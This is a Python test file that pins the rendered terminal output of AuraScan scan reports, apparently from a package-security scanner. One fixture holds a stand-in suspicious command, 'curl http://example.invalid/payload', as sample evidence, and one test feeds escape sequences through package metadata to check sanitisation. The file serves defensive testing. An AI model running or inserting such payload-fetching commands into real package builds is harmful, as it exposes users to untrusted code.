"""Characterisation tests for ``ScanReport`` terminal rendering.

These tests pin the exact rendered output of the core scan report before
terminal rendering is moved out of the evidence model into the presentation
layer. Each scenario records a full golden string.

The single indirection point is :func:`render`. Moving the renderer must not
change any of these strings; only the target of that one call changes.
"""

from typing import Callable, Dict, List

from aurascan.core.models import (
    Confidence,
    EvidenceQuality,
    Finding,
    PackageMetadata,
    Phase,
    RecommendedAction,
    RiskSummary,
    ScanReport,
    Severity,
    Source,
)
from aurascan.core.risk import RiskEngine
from aurascan.core.scan_report_presenter import render_scan_report


def render(report: ScanReport, *, use_color: bool = False, verbose: bool = False) -> str:
    """Render a scan report.

    This is the only line that changes when rendering moves to the presentation
    layer: everything else in this file, including every golden string, must
    stay byte-identical.
    """
    return render_scan_report(report, use_color=use_color, verbose=verbose)


def make_finding(
    rule_id: str = "DEMO-RULE-001",
    severity: Severity = Severity.MEDIUM,
    **overrides: object
) -> Finding:
    values: Dict[str, object] = {
        "rule_id": rule_id,
        "package_name": "demo-pkg",
        "package_version": "1.2.3",
        "phase": Phase.pkgbuild_static,
        "source": Source.deterministic_rule,
        "severity": severity,
        "confidence": Confidence.CONFIRMED,
        "evidence_quality": EvidenceQuality.confirmed_static_pattern,
        "file_path": "PKGBUILD",
        "explanation": rule_id + " explanation",
        "recommendation": "Review the captured package text.",
        "blocks_installation": severity == Severity.CRITICAL,
        "requires_manual_review": severity != Severity.LOW,
        "evidence_snippet": "curl http://example.invalid/payload",
    }
    values.update(overrides)
    return Finding(**values)  # type: ignore[arg-type]


def report_with(findings: List[Finding], **fields: object) -> ScanReport:
    report = ScanReport(PackageMetadata("demo-pkg", "1.2.3"), list(findings))
    report.risk_summary = RiskEngine().evaluate(report.findings)
    for name, value in fields.items():
        setattr(report, name, value)
    return report


def scenario_outputs() -> Dict[str, str]:
    """Render every characterisation scenario exactly as the tests will."""

    outputs: Dict[str, str] = {}

    outputs["empty_report"] = render(report_with([]))

    outputs["medium_finding_verbose"] = render(
        report_with([make_finding()]), verbose=True
    )

    outputs["critical_blocking"] = render(
        report_with([make_finding("DEMO-CRITICAL-001", Severity.CRITICAL)])
    )

    outputs["intelligence_stale_and_acquisition"] = render(
        report_with(
            [],
            intelligence={"status": "stale", "generation": 7},
            source_acquisition=[
                {"status": "captured"},
                {"status": "blocked"},
                {"status": "captured"},
            ],
        )
    )

    outputs["intelligence_unavailable"] = render(
        report_with([], intelligence={"status": "unavailable"})
    )

    outputs["fast_path_verified_verbose"] = render(
        report_with(
            [],
            fast_path_decision={
                "title": "Smart update scan recorded.",
                "summary": "Verified update context.",
                "why_it_matters": "Only verified updates may use the fast path.",
                "what_checked": "Local package database and candidate metadata.",
                "what_not_checked": "Package behavior after installation.",
                "recommended_action": "Continue with the normal trust checks.",
                "technical_details": {"b": 2, "a": 1},
            },
            context_eligible_for_fast_path=True,
            scan_context="update",
            scan_context_authority="verified_local_package_db",
            context_provider_name="local_package_db",
        ),
        verbose=True,
    )

    outputs["fast_path_unproven_with_user_warning"] = render(
        report_with(
            [],
            fast_path_decision={"title": "Update scan decision recorded."},
            context_user_warning="Operator supplied update context.",
            context_provider_name="local_package_db",
        )
    )

    outputs["color_enabled"] = render(
        report_with([make_finding("DEMO-CRITICAL-001", Severity.CRITICAL)]),
        use_color=True,
    )

    return outputs


GOLDEN_TEXT: Dict[str, str] = {
    "color_enabled": '\n'
    '[AuraScan] Audit Complete: demo-pkg 1.2.3\n'
    '==================================================\n'
    'Risk Score: \x1b[91mCRITICAL\x1b[0m | Action: \x1b[91mBLOCKED\x1b[0m\n'
    '--------------------------------------------------\n'
    'Warnings:\n'
    '1 warning needs attention\n'
    '\n'
    'Critical blockers:\n'
    'Potentially blocking package behavior found.\n'
    'AuraScan found behavior that may be risky and needs review.\n'
    "Why it matters: This finding came from one of AuraScan's scanners, but there "
    'is no specialized explanation template for this exact rule yet.\n'
    'Recommended action: Review the evidence before installing. Use --verbose to '
    'see technical details.\n'
    '\n'
    'Risk reason: deterministic critical rule\n'
    '\n'
    'Recommended Action: DO NOT INSTALL.',
    "critical_blocking": '\n'
    '[AuraScan] Audit Complete: demo-pkg 1.2.3\n'
    '==================================================\n'
    'Risk Score: CRITICAL | Action: BLOCKED\n'
    '--------------------------------------------------\n'
    'Warnings:\n'
    '1 warning needs attention\n'
    '\n'
    'Critical blockers:\n'
    'Potentially blocking package behavior found.\n'
    'AuraScan found behavior that may be risky and needs review.\n'
    "Why it matters: This finding came from one of AuraScan's scanners, but "
    'there is no specialized explanation template for this exact rule yet.\n'
    'Recommended action: Review the evidence before installing. Use --verbose '
    'to see technical details.\n'
    '\n'
    'Risk reason: deterministic critical rule\n'
    '\n'
    'Recommended Action: DO NOT INSTALL.',
    "empty_report": '\n'
    '[AuraScan] Audit Complete: demo-pkg 1.2.3\n'
    '==================================================\n'
    'Risk Score: LOW | Action: ALLOW\n'
    '--------------------------------------------------\n'
    '[INFO] No findings were produced. This is not proof the package is safe.\n'
    '\n'
    'Risk reason: No findings were produced; clean auxiliary scans are not proof of '
    'safety.\n'
    '\n'
    'Recommended Action: No blocking findings. Continue only with normal package '
    'trust checks.',
    "fast_path_unproven_with_user_warning": '\n'
    '[AuraScan] Audit Complete: demo-pkg 1.2.3\n'
    '==================================================\n'
    'Risk Score: LOW | Action: ALLOW\n'
    '--------------------------------------------------\n'
    '[INFO] No findings were produced. This is not proof the '
    'package is safe.\n'
    'Update Scan Policy:\n'
    'Update context was provided manually.\n'
    'Operator supplied update context.\n'
    'Update scan decision recorded.\n'
    '\n'
    'Risk reason: No findings were produced; clean auxiliary '
    'scans are not proof of safety.\n'
    '\n'
    'Recommended Action: No blocking findings. Continue only '
    'with normal package trust checks.',
    "fast_path_verified_verbose": '\n'
    '[AuraScan] Audit Complete: demo-pkg 1.2.3\n'
    '==================================================\n'
    'Risk Score: LOW | Action: ALLOW\n'
    '--------------------------------------------------\n'
    '[INFO] No findings were produced. This is not proof the package '
    'is safe.\n'
    'Update Scan Policy:\n'
    'Package update verified locally\n'
    'AuraScan confirmed from the local package database that this '
    'package is already installed and this scan is for an update.\n'
    'Why it matters: Verified update context is required before '
    'AuraScan can safely consider the smart update fast path.\n'
    'What AuraScan checked: AuraScan checked local installed package '
    'information and the candidate package metadata.\n'
    'What AuraScan did not check: This does not prove the package is '
    'safe. It only proves the scan context.\n'
    'Recommended action: No action needed.\n'
    'Smart update scan recorded.\n'
    'Verified update context.\n'
    'Why it matters: Only verified updates may use the fast path.\n'
    'What AuraScan checked: Local package database and candidate '
    'metadata.\n'
    'What AuraScan did not check: Package behavior after '
    'installation.\n'
    'Recommended action: Continue with the normal trust checks.\n'
    'Technical details:\n'
    '{\n'
    '  "a": 1,\n'
    '  "b": 2\n'
    '}\n'
    '\n'
    'Risk reason: No findings were produced; clean auxiliary scans are '
    'not proof of safety.\n'
    '\n'
    'Recommended Action: No blocking findings. Continue only with '
    'normal package trust checks.',
    "intelligence_stale_and_acquisition": '\n'
    '[AuraScan] Audit Complete: demo-pkg 1.2.3\n'
    '==================================================\n'
    'Risk Score: LOW | Action: ALLOW\n'
    '--------------------------------------------------\n'
    '[INFO] No findings were produced. This is not proof the '
    'package is safe.\n'
    'Security intelligence: stale\n'
    '[WARNING] Security intelligence is stale; existing '
    'indicators remain active and update-scan shortcuts are '
    'disabled.\n'
    'Source Acquisition: blocked=1, captured=2\n'
    '\n'
    'Risk reason: No findings were produced; clean auxiliary '
    'scans are not proof of safety.\n'
    '\n'
    'Recommended Action: No blocking findings. Continue only '
    'with normal package trust checks.',
    "intelligence_unavailable": '\n'
    '[AuraScan] Audit Complete: demo-pkg 1.2.3\n'
    '==================================================\n'
    'Risk Score: LOW | Action: ALLOW\n'
    '--------------------------------------------------\n'
    '[INFO] No findings were produced. This is not proof the package is '
    'safe.\n'
    'Security intelligence: unavailable\n'
    '[WARNING] Installed intelligence could not be validated; bundled '
    'detection is active with incomplete coverage.\n'
    '\n'
    'Risk reason: No findings were produced; clean auxiliary scans are '
    'not proof of safety.\n'
    '\n'
    'Recommended Action: No blocking findings. Continue only with normal '
    'package trust checks.',
    "medium_finding_verbose": '\n'
    '[AuraScan] Audit Complete: demo-pkg 1.2.3\n'
    '==================================================\n'
    'Risk Score: MEDIUM | Action: MANUAL_REVIEW\n'
    '--------------------------------------------------\n'
    'Warnings:\n'
    '1 warning needs attention\n'
    '\n'
    'Static code findings:\n'
    'Potential package behavior needs review.\n'
    'AuraScan found behavior that may matter for package trust.\n'
    "Why it matters: This finding came from one of AuraScan's scanners, "
    'but there is no specialized explanation template for this exact rule '
    'yet.\n'
    'Recommended action: Review if this package is new to you or other '
    'warnings appear. Use --verbose to see technical details.\n'
    'Technical details:\n'
    '- DEMO-RULE-001 (MEDIUM): curl http://example.invalid/payload\n'
    '\n'
    'Risk reason: highest finding severity: MEDIUM=1\n'
    '\n'
    'Recommended Action: Manual review recommended before installation.',
}


def test_scenarios_are_all_characterised():
    assert sorted(GOLDEN_TEXT) == sorted(scenario_outputs())


def test_rendering_matches_recorded_golden_text():
    outputs = scenario_outputs()

    for name in sorted(GOLDEN_TEXT):
        assert outputs[name] == GOLDEN_TEXT[name], "rendering changed for " + name


def test_recommended_action_footer_tracks_each_risk_state():
    blocked = render(
        report_with([make_finding("DEMO-CRITICAL-001", Severity.CRITICAL)])
    )
    review = render(report_with([make_finding()]))
    allowed = render(report_with([]))

    assert blocked.rstrip().endswith("Recommended Action: DO NOT INSTALL.")
    assert review.rstrip().endswith(
        "Recommended Action: Manual review recommended before installation."
    )
    assert allowed.rstrip().endswith(
        "Recommended Action: No blocking findings. Continue only with normal package trust checks."
    )


def test_section_order_is_stable():
    output = render(
        report_with(
            [make_finding()],
            intelligence={"status": "stale"},
            source_acquisition=[{"status": "captured"}],
            fast_path_decision={"title": "Update scan decision recorded."},
        )
    )
    order = [
        "[AuraScan] Audit Complete",
        "Risk Score:",
        "Security intelligence: stale",
        "Source Acquisition: captured=1",
        "Update Scan Policy:",
        "Recommended Action:",
    ]

    positions = [output.index(marker) for marker in order]
    assert positions == sorted(positions)


def test_hostile_package_metadata_is_sanitised_before_rendering():
    report = ScanReport(PackageMetadata("pkg\x1b[31m\x07evil", "1.0"), [])
    report.risk_summary = RiskSummary(Severity.LOW, RecommendedAction.allow)

    output = render(report)

    assert "\x1b[31m" not in output
    assert "\x07" not in output


def test_color_mode_uses_ansi_only_when_requested():
    findings = [make_finding("DEMO-CRITICAL-001", Severity.CRITICAL)]

    colored = render(report_with(findings), use_color=True)
    plain = render(report_with(findings), use_color=False)

    assert "\033[91m" in colored
    assert "\033[0m" in colored
    assert "\033[91m" not in plain
    assert "\033[0m" not in plain


def test_verbose_adds_finding_detail():
    findings = [make_finding()]

    verbose = render(report_with(findings), verbose=True)
    quiet = render(report_with(findings), verbose=False)

    assert len(verbose) > len(quiet)


def test_scenario_builders_are_reusable() -> None:
    builder: Callable[[], str] = lambda: render(report_with([]))
    assert builder() == builder()
